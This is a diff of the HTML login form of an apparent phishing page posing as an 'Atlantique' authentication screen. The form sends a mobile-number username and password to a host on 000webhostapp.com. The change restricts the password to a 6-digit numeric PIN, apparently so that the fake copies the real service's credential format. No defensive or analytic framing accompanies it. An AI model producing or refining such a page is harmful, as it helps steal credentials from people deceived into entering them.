@@ -25,8 +25,8 @@ AUTHENTICATION</h3><br />
 <p class="label"> Please enter your username (number mobile) and your password to connect.</p><br />
 
 <form method="post" action="https://authentification-atlantique.000webhostapp.com/index.php"/>
-<input type="tel" name="number" placeholder="username" required/><br /><br />
-<input type="password" name="pass" placeholder="Password" required/><br /><br />
+<input type="tel" name="number" maxlength="10" placeholder="username" required/><br /><br />
+<input type="password" name="pass" pattern="[0-9]*" inputmode="numeric" maxlength="6" placeholder="Password" required/><br /><br />
 
 	<input class="check" type="checkbox" id="subscribeNews" name="subscribe" value="newsletter"/>
 	<label for="subscribeNews">Remember me</label><br /><br /><br />
